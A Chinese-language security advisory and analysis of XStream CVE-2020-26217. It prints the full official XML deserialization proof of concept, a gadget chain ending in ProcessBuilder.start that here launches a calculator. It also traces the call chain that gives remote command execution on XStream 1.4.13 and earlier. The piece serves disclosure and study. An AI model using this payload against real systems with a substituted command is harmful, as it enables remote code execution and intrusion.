\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[xz.aliyun.com\](https://xz.aliyun.com/t/8526)

0x01 漏洞描述
---------

CVE-2020-26217 出现了新的绕过手法，通过一个黑名单之外的 gadget，可以成功绕过之前的补丁造成远程命令执行。包括 1.4.13 在内的所有版本都会受到漏洞的影响（使用了 XStream 官方提供的安全框架的系统将不受本次漏洞影响）。

0x02 风险等级
---------

**严重**

0x03 漏洞详情
---------

PoC 已经在官方放出，如下：

```
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
            <contentType>text/plain</contentType>
            <is class='java.io.SequenceInputStream'>
              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                <iterator class='javax.imageio.spi.FilterIterator'>
                  <iter class='java.util.ArrayList$Itr'>
                    <cursor>0</cursor>
                    <lastRet>-1</lastRet>
                    <expectedModCount>1</expectedModCount>
                    <outer-class>
                      <java.lang.ProcessBuilder>
                        <command>
                          <string>open</string>
                          <string>-a</string>
                          <string>Calculator</string>
                        </command>
                      </java.lang.ProcessBuilder>
                    </outer-class>
                  </iter>
                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>start</name>
                  </filter>
                  <next/>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class='java.io.ByteArrayInputStream'>
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

演示如下：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116141241-bbd6d10a-27d2-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20201116141241-bbd6d10a-27d2-1.gif)

XStream 作为一个支持将 xml 转对象的第三方，一直以来都是存在着被利用的风险，而在没有使用官方安全框架的前提下，补丁就只能通过黑名单来进行防御，所以才有了这次全新 gadget 的绕过，下面针对这一个 gadget 进行一些原理分析。

XStream 在对 map 类型对象进行反序列化的时候，如果 map 对象内存在 entry，自然需要先实例化一个空 map，以及 entry，再将 entry put 到 map 中  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140717-fb14204e-27d1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140717-fb14204e-27d1-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140737-06924a68-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140737-06924a68-27d2-1.png)  
而这次利用的关键就在于这个 entry 的构造，先去看一下实例化后的这个 entry 是什么样子的，其中红框标记的地方为 poc 刻意指定的值，也就是在后续调用栈里需要重点关注的地方，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140756-11d4448a-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140756-11d4448a-27d2-1.png)  
map 在 put entry 的时候，是需要获取 entry 的 hash 的，进而在后续会调用 entry 的 hashCode 函数，那我们去看一下 NativeString 的 hashCode 函数会去做一些什么，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140808-195bf45a-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140808-195bf45a-27d2-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140832-2799f616-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140832-2799f616-27d2-1.png)  
可以看到经过两个调用栈之后，会去调用 value 值的 toString 函数，即 Base64Data 类的 toString，调用 toString 自然就会调用 get 函数，看一下 Base64Data.get，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140848-312a72b4-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140848-312a72b4-27d2-1.png)  
get 函数生成了一个空的 ByteArrayOutputStreamEx 对象并将自身的 dataHandler 的 datasource 作为参数，传给这个对象的 readFrom 函数，继而调用了 datasource 的 read 函数，即 SequenceInputStream.read，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140859-3784918a-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140859-3784918a-27d2-1.png)  
在 SequenceInputStream.read 函数中会循环调用每个 Enumeration 的 nextElement 函数，即 MultiUIDefaults$MultiUIDefaultsEnumerator.nextElement，继而去调用对应 key 的 next 函数进行迭代，而这个时候的迭代器是精心构造的 FilterIterator，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140913-402c154c-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140913-402c154c-27d2-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140924-46c4b13e-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140924-46c4b13e-27d2-1.png)  
在调用 FilterIterator 进行迭代的时候，会调用恶意构造的 ImageIO$ContainsFilter 的 filter 方法，从而进行了反射调用，而反射的 method、param 和 class 都是 ContainsFilter 的成员对象，攻击者可控，从而造成了 rce，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140935-4d07185c-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140935-4d07185c-27d2-1.png)  
调用链比较长在最后附上调用栈，  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20201116140948-54c401ae-27d2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201116140948-54c401ae-27d2-1.png)

0x04 参考链接
---------

[https://x-stream.github.io/CVE-2020-26217.html](https://x-stream.github.io/CVE-2020-26217.html)